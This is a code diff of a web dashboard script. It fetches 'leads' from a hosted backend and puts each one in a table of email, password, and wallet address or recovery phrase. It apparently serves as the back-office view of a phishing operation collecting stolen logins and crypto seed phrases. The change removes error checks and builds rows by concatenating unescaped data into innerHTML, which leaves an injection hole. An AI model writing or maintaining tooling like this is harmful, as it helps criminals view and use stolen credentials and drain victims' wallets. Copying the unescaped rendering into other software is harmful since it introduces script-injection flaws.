@@ -27,35 +27,24 @@
     <script>
         async function loadLeads() {
             try {
-                // Pointing directly to your Render backend URL
                 const res = await fetch('https://cb-backend-new.onrender.com/dashboard');
-                
-                if (!res.ok) {
-                    throw new Error(`Server responded with ${res.status}`);
-                }
-
                 const data = await res.json();
                 const body = document.getElementById('leadsBody');
-                
-                body.innerHTML = ''; // Clear table before adding new data
-
+                body.innerHTML = ''; 
                 data.forEach(lead => {
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
+                    const row = `<tr>
                         <td>${lead.email || 'N/A'}</td>
                         <td>${lead.password || 'N/A'}</td>
                         <td>${lead.walletAddress || lead.recoveryPhrase || 'N/A'}</td>
                         <td>${new Date(lead.timestamp).toLocaleString()}</td>
-                    `;
-                    body.appendChild(row);
+                    </tr>`;
+                    body.innerHTML += row;
                 });
-            } catch (error) {
-                console.error('Error loading leads:', error);
-                document.getElementById('leadsBody').innerHTML = 
-                    '<tr><td colspan="4" style="color: red; text-align: center;">Error loading data. Check console.</td></tr>';
+            } catch (e) {
+                console.error(e);
+                document.getElementById('leadsBody').innerHTML = '<tr><td colspan="4">Error loading leads.</td></tr>';
             }
         }
-
         loadLeads();
     </script>
 </body>
